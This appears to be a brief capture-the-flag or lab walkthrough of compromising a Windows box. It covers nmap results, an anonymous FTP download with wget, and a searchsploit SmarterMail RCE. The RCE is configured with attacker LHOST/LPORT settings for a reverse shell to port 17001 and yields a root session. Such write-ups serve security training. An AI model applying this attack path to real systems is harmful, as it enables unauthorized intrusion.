Autorecon on 192.168.245.65

I feel like I kind of cheated by looking at the community difficulty of easy XD

Get all files as ftp allows anonymous logins. None of the logs seems interesting though.
`wget -m ftp://anonymous:anonymous@192.168.245.65/`

Login to port 80 to see a default site. Try the other ports like 9998
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

port 9998 shows smartermail. Searchsploit smartermail to show an RCE.
Input 
```
HOST='192.168.245.65'
PORT=9998
LHOST='192.168.45.216'
LPORT=4444
```
but exploit does not work.
Google `17001/tcp open  remoting  MS .NET Remoting services` to find out that it is the port for smartermail
```
HOST='192.168.245.65'
PORT=17001
LHOST='192.168.45.216'
LPORT=4444
```
Our penelope listener caught a session and its root.